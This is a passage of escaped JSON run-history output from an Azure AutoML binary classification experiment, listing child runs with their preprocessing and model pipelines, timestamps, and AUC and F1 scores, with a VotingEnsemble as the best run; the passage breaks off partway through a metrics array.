\"ProblemInfoJsonString\": \"{\\\"dataset_num_categorical\\\": 0, \\\"is_sparse\\\": true, \\\"subsampling\\\": false, \\\"dataset_classes\\\": 2, \\\"dataset_features\\\": 24, \\\"dataset_samples\\\": 768, \\\"single_frequency_class_detected\\\": false}\", \"ModelExplainRunId\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_ModelExplain\"}, \"tags\": {\"model_explain_run\": \"best_run\", \"_aml_system_azureml.automlComponent\": \"AutoML\", \"pipeline_id\": \"\", \"score\": \"\", \"predicted_cost\": \"\", \"fit_time\": \"\", \"training_percent\": \"\", \"iteration\": \"\", \"run_preprocessor\": \"\", \"run_algorithm\": \"\", \"dynamic_whitelisting_iterations\": \"<25>;<30>;<35>;\", \"automl_best_child_run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_37\", \"model_explain_best_run_child_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_37\"}, \"end_time_utc\": \"2021-02-01T10:33:27.168678Z\", \"status\": \"Completed\", \"log_files\": {}, \"log_groups\": [], \"run_duration\": \"0:32:22\"}, \"child_runs\": [{\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_0\", \"run_number\": 213, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:13:16.724346Z\", \"end_time\": \"2021-02-01T10:15:37.034502Z\", \"created_time\": \"2021-02-01T10:10:27.802925Z\", \"created_time_dt\": \"2021-02-01T10:10:27.802925Z\", \"duration\": \"0:05:09\", \"iteration\": \"0\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.79810139, \"best_metric\": 0.79810139}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_2\", \"run_number\": 214, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:13:15.917025Z\", \"end_time\": \"2021-02-01T10:15:29.734756Z\", \"created_time\": \"2021-02-01T10:10:27.804175Z\", \"created_time_dt\": \"2021-02-01T10:10:27.804175Z\", \"duration\": \"0:05:01\", \"iteration\": \"2\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80304946, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_1\", \"run_number\": 215, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:13:15.479651Z\", \"end_time\": \"2021-02-01T10:15:29.052651Z\", \"created_time\": \"2021-02-01T10:10:27.819613Z\", \"created_time_dt\": \"2021-02-01T10:10:27.819613Z\", \"duration\": \"0:05:01\", \"iteration\": \"1\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, XGBoostClassifier\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.83662103, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_4\", \"run_number\": 216, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:10:38.22789Z\", \"end_time\": \"2021-02-01T10:12:46.404Z\", \"created_time\": \"2021-02-01T10:10:27.832385Z\", \"created_time_dt\": \"2021-02-01T10:10:27.832385Z\", \"duration\": \"0:02:18\", \"iteration\": \"4\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80937598, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_3\", \"run_number\": 217, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:12:49.62554Z\", \"end_time\": \"2021-02-01T10:14:57.615112Z\", \"created_time\": \"2021-02-01T10:10:27.809617Z\", \"created_time_dt\": \"2021-02-01T10:10:27.809617Z\", \"duration\": \"0:04:29\", \"iteration\": \"3\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81983168, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_5\", \"run_number\": 218, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:13:17.417748Z\", \"end_time\": \"2021-02-01T10:15:36.153889Z\", \"created_time\": \"2021-02-01T10:12:49.959508Z\", \"created_time_dt\": \"2021-02-01T10:12:49.959508Z\", \"duration\": \"0:02:46\", \"iteration\": \"5\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.8250905, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_6\", \"run_number\": 219, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:15:12.242463Z\", \"end_time\": \"2021-02-01T10:17:16.592252Z\", \"created_time\": \"2021-02-01T10:15:00.85014Z\", \"created_time_dt\": \"2021-02-01T10:15:00.85014Z\", \"duration\": \"0:02:15\", \"iteration\": \"6\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81959607, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_7\", \"run_number\": 220, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:15:43.878066Z\", \"end_time\": \"2021-02-01T10:17:51.373082Z\", \"created_time\": \"2021-02-01T10:15:33.13819Z\", \"created_time_dt\": \"2021-02-01T10:15:33.13819Z\", \"duration\": \"0:02:18\", \"iteration\": \"7\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80083596, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_8\", \"run_number\": 221, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:15:48.460609Z\", \"end_time\": \"2021-02-01T10:17:55.783718Z\", \"created_time\": \"2021-02-01T10:15:38.33872Z\", \"created_time_dt\": \"2021-02-01T10:15:38.33872Z\", \"duration\": \"0:02:17\", \"iteration\": \"8\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.78861157, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_9\", \"run_number\": 222, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:15:53.838261Z\", \"end_time\": \"2021-02-01T10:17:58.171591Z\", \"created_time\": \"2021-02-01T10:15:43.277238Z\", \"created_time_dt\": \"2021-02-01T10:15:43.277238Z\", \"duration\": \"0:02:14\", \"iteration\": \"9\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.78719919, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_10\", \"run_number\": 223, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:15:53.864363Z\", \"end_time\": \"2021-02-01T10:17:53.977426Z\", \"created_time\": \"2021-02-01T10:15:43.310777Z\", \"created_time_dt\": \"2021-02-01T10:15:43.310777Z\", \"duration\": \"0:02:10\", \"iteration\": \"10\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80539894, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_11\", \"run_number\": 224, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:17:31.200759Z\", \"end_time\": \"2021-02-01T10:19:29.908455Z\", \"created_time\": \"2021-02-01T10:17:20.416325Z\", \"created_time_dt\": \"2021-02-01T10:17:20.416325Z\", \"duration\": \"0:02:09\", \"iteration\": \"11\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81419281, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_12\", \"run_number\": 225, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:18:05.858043Z\", \"end_time\": \"2021-02-01T10:20:06.154308Z\", \"created_time\": \"2021-02-01T10:17:55.386056Z\", \"created_time_dt\": \"2021-02-01T10:17:55.386056Z\", \"duration\": \"0:02:10\", \"iteration\": \"12\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.78897618, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_13\", \"run_number\": 226, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:18:10.658434Z\", \"end_time\": \"2021-02-01T10:20:17.722994Z\", \"created_time\": \"2021-02-01T10:18:00.534698Z\", \"created_time_dt\": \"2021-02-01T10:18:00.534698Z\", \"duration\": \"0:02:17\", \"iteration\": \"13\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f49058fb5c0\", \"primary_metric\": 0.82080753, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_14\", \"run_number\": 227, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:18:11.369113Z\", \"end_time\": \"2021-02-01T10:20:22.807139Z\", \"created_time\": \"2021-02-01T10:18:00.740273Z\", \"created_time_dt\": \"2021-02-01T10:18:00.740273Z\", \"duration\": \"0:02:22\", \"iteration\": \"14\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81287284, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_15\", \"run_number\": 228, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:18:15.41263Z\", \"end_time\": \"2021-02-01T10:20:18.400587Z\", \"created_time\": \"2021-02-01T10:18:05.609199Z\", \"created_time_dt\": \"2021-02-01T10:18:05.609199Z\", \"duration\": \"0:02:12\", \"iteration\": \"15\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, ExtremeRandomTrees\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fedc4d16ac8\", \"primary_metric\": 0.8276032, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_16\", \"run_number\": 229, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:19:44.99904Z\", \"end_time\": \"2021-02-01T10:21:45.542877Z\", \"created_time\": \"2021-02-01T10:19:34.105766Z\", \"created_time_dt\": \"2021-02-01T10:19:34.105766Z\", \"duration\": \"0:02:11\", \"iteration\": \"16\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80327692, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_17\", \"run_number\": 230, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:20:21.610405Z\", \"end_time\": \"2021-02-01T10:22:34.62942Z\", \"created_time\": \"2021-02-01T10:20:09.867708Z\", \"created_time_dt\": \"2021-02-01T10:20:09.867708Z\", \"duration\": \"0:02:24\", \"iteration\": \"17\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, ExtremeRandomTrees\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80690593, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_18\", \"run_number\": 231, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:20:32.772669Z\", \"end_time\": \"2021-02-01T10:22:37.003735Z\", \"created_time\": \"2021-02-01T10:20:21.110819Z\", \"created_time_dt\": \"2021-02-01T10:20:21.110819Z\", \"duration\": \"0:02:15\", \"iteration\": \"18\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, RandomForest\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80123407, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_19\", \"run_number\": 232, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:20:37.409873Z\", \"end_time\": \"2021-02-01T10:22:49.930931Z\", \"created_time\": \"2021-02-01T10:20:26.576571Z\", \"created_time_dt\": \"2021-02-01T10:20:26.576571Z\", \"duration\": \"0:02:23\", \"iteration\": \"19\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7effc8ada6d8\", \"primary_metric\": 0.82402664, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_20\", \"run_number\": 233, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:20:37.62017Z\", \"end_time\": \"2021-02-01T10:22:38.468861Z\", \"created_time\": \"2021-02-01T10:20:26.654795Z\", \"created_time_dt\": \"2021-02-01T10:20:26.654795Z\", \"duration\": \"0:02:11\", \"iteration\": \"20\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"SparseNormalizer, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.SparseNormalizer object at 0x7f17c34c6390\", \"primary_metric\": 0.74924748, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_21\", \"run_number\": 234, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:21:58.589683Z\", \"end_time\": \"2021-02-01T10:24:03.251376Z\", \"created_time\": \"2021-02-01T10:21:48.21688Z\", \"created_time_dt\": \"2021-02-01T10:21:48.21688Z\", \"duration\": \"0:02:15\", \"iteration\": \"21\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f6cdada0a58\", \"primary_metric\": 0.82984727, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_22\", \"run_number\": 235, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:22:47.539254Z\", \"end_time\": \"2021-02-01T10:24:52.383683Z\", \"created_time\": \"2021-02-01T10:22:36.712039Z\", \"created_time_dt\": \"2021-02-01T10:22:36.712039Z\", \"duration\": \"0:02:15\", \"iteration\": \"22\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.81522085, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_23\", \"run_number\": 236, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:22:51.474307Z\", \"end_time\": \"2021-02-01T10:24:52.177866Z\", \"created_time\": \"2021-02-01T10:22:40.544658Z\", \"created_time_dt\": \"2021-02-01T10:22:40.544658Z\", \"duration\": \"0:02:11\", \"iteration\": \"23\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.83145933, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_24\", \"run_number\": 237, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:22:50.925148Z\", \"end_time\": \"2021-02-01T10:24:54.078329Z\", \"created_time\": \"2021-02-01T10:22:40.623106Z\", \"created_time_dt\": \"2021-02-01T10:22:40.623106Z\", \"duration\": \"0:02:13\", \"iteration\": \"24\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.83658722, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_25\", \"run_number\": 238, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:23:03.272454Z\", \"end_time\": \"2021-02-01T10:25:02.366337Z\", \"created_time\": \"2021-02-01T10:22:53.075988Z\", \"created_time_dt\": \"2021-02-01T10:22:53.075988Z\", \"duration\": \"0:02:09\", \"iteration\": \"25\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fd71c4fe550\", \"primary_metric\": 0.81242053, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_26\", \"run_number\": 239, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:24:17.812618Z\", \"end_time\": \"2021-02-01T10:26:22.352955Z\", \"created_time\": \"2021-02-01T10:24:06.088703Z\", \"created_time_dt\": \"2021-02-01T10:24:06.088703Z\", \"duration\": \"0:02:16\", \"iteration\": \"26\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LightGBM\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.83488757, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_27\", \"run_number\": 240, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:25:05.588561Z\", \"end_time\": \"2021-02-01T10:27:09.81597Z\", \"created_time\": \"2021-02-01T10:24:54.862512Z\", \"created_time_dt\": \"2021-02-01T10:24:54.862512Z\", \"duration\": \"0:02:14\", \"iteration\": \"27\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f67a530e828\", \"primary_metric\": 0.78680683, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_28\", \"run_number\": 241, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:25:05.725747Z\", \"end_time\": \"2021-02-01T10:27:09.977141Z\", \"created_time\": \"2021-02-01T10:24:54.931378Z\", \"created_time_dt\": \"2021-02-01T10:24:54.931378Z\", \"duration\": \"0:02:15\", \"iteration\": \"28\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f56374b8240\", \"primary_metric\": 0.81328092, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_29\", \"run_number\": 242, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:25:11.936576Z\", \"end_time\": \"2021-02-01T10:27:24.513899Z\", \"created_time\": \"2021-02-01T10:25:00.512295Z\", \"created_time_dt\": \"2021-02-01T10:25:00.512295Z\", \"duration\": \"0:02:24\", \"iteration\": \"29\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, GradientBoosting\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f560ed78fd0\", \"primary_metric\": 0.83554829, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_30\", \"run_number\": 243, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:25:17.272478Z\", \"end_time\": \"2021-02-01T10:27:21.423087Z\", \"created_time\": \"2021-02-01T10:25:06.878571Z\", \"created_time_dt\": \"2021-02-01T10:25:06.878571Z\", \"duration\": \"0:02:14\", \"iteration\": \"30\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7fb91072ab00\", \"primary_metric\": 0.81962716, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_31\", \"run_number\": 244, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:26:35.021035Z\", \"end_time\": \"2021-02-01T10:28:51.161824Z\", \"created_time\": \"2021-02-01T10:26:24.597619Z\", \"created_time_dt\": \"2021-02-01T10:26:24.597619Z\", \"duration\": \"0:02:26\", \"iteration\": \"31\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, GradientBoosting\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f2646d78f98\", \"primary_metric\": 0.83071679, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_32\", \"run_number\": 245, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:27:23.734Z\", \"end_time\": \"2021-02-01T10:29:28.708683Z\", \"created_time\": \"2021-02-01T10:27:12.202571Z\", \"created_time_dt\": \"2021-02-01T10:27:12.202571Z\", \"duration\": \"0:02:16\", \"iteration\": \"32\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, SGD\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.80903376, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_33\", \"run_number\": 246, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:27:23.596519Z\", \"end_time\": \"2021-02-01T10:29:28.261227Z\", \"created_time\": \"2021-02-01T10:27:12.234315Z\", \"created_time_dt\": \"2021-02-01T10:27:12.234315Z\", \"duration\": \"0:02:16\", \"iteration\": \"33\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LogisticRegression\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.82184527, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_34\", \"run_number\": 247, \"metric\": null, \"status\": \"Canceled\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:27:33.709501Z\", \"end_time\": \"2021-02-01T10:29:37.806367Z\", \"created_time\": \"2021-02-01T10:27:23.739613Z\", \"created_time_dt\": \"2021-02-01T10:27:23.739613Z\", \"duration\": \"0:02:14\", \"iteration\": \"34\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"MaxAbsScaler, LogisticRegression\", \"run_properties\": \"copy=True\", \"primary_metric\": 0.82087716, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_35\", \"run_number\": 248, \"metric\": null, \"status\": \"Canceled\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:27:38.823046Z\", \"end_time\": \"2021-02-01T10:29:39.379276Z\", \"created_time\": \"2021-02-01T10:27:28.19566Z\", \"created_time_dt\": \"2021-02-01T10:27:28.19566Z\", \"duration\": \"0:02:11\", \"iteration\": \"35\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"StandardScalerWrapper, XGBoostClassifier\", \"run_properties\": \"<azureml.automl.runtime.shared.model_wrappers.StandardScalerWrapper object at 0x7f942b73bb38\", \"primary_metric\": 0.81265617, \"best_metric\": 0.83662103}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_36\", \"run_number\": 249, \"metric\": null, \"status\": \"Canceled\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:29:05.5267Z\", \"end_time\": \"2021-02-01T10:29:36.366541Z\", \"created_time\": \"2021-02-01T10:28:53.531772Z\", \"created_time_dt\": \"2021-02-01T10:28:53.531772Z\", \"duration\": \"0:00:42\", \"iteration\": \"36\", \"goal\": null, \"run_name\": \"Canceled\", \"run_properties\": null}, {\"run_id\": \"AutoML_630b7516-809c-457c-a8a5-ef5652ee5bc8_37\", \"run_number\": 250, \"metric\": null, \"status\": \"Completed\", \"run_type\": \"azureml.scriptrun\", \"training_percent\": \"100\", \"start_time\": \"2021-02-01T10:29:50.420391Z\", \"end_time\": \"2021-02-01T10:33:18.091123Z\", \"created_time\": \"2021-02-01T10:29:40.431619Z\", \"created_time_dt\": \"2021-02-01T10:29:40.431619Z\", \"duration\": \"0:03:37\", \"iteration\": \"37\", \"goal\": \"AUC_weighted_max\", \"run_name\": \"VotingEnsemble\", \"run_properties\": \"classification_labels=None,\\n                              estimators=[('1',\\n                                           Pipeline(memory=None,\\n                                                    steps=[('maxabsscaler',\\n                                                            MaxAbsScaler(copy=True\", \"primary_metric\": 0.84453414, \"best_metric\": 0.84453414}], \"children_metrics\": {\"categories\": [0], \"series\": {\"f1_score_macro\": [{\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", \"25\", \"26\", \"27\", \"28\", \"29\", \"30\", \"31\", \"32\", \"33\", \"34\", \"35\", \"37\"], \"mode\": \"markers\", \"name\": \"f1_score_macro\", \"stepped\": false, \"type\": \"scatter\", \"data\": [0.7060869524729553, 0.7386733613551352, 0.7083771707580016, 0.7311708746381048, 0.6597390035752252, 0.7140436403402317, 0.6948145190310726, 0.6251077589988974, 0.43285886480879715, 0.7018401258521193, 0.69650757539272, 0.710046071375748, 0.6881350972185151, 0.7133648428740039, 0.7052090639102742, 0.7067244714985378, 0.7100000160528163, 0.711476403242599, 0.7219711639412564, 0.7323429719874582, 0.6623612165769488, 0.7339091535370454, 0.7080983085986131, 0.7219857330902391, 0.7204019060634814, 0.7087718561982087, 0.7267833780247503, 0.7035258831465685, 0.7103741857447166, 0.732660079801357, 0.7144261445701544, 0.7321551296359287, 0.710834011104348, 0.7281793416041236, 0.7234252102382335, 0.705075327147772, 0.732896291427265]}, {\"categories\": [\"0\", \"1\", \"2\", \"3\", \"4\", \"5\", \"6\", \"7\", \"8\", \"9\", \"10\", \"11\", \"12\", \"13\", \"14\", \"15\", \"16\", \"17\", \"18\", \"19\", \"20\", \"21\", \"22\", \"23\", \"24\", 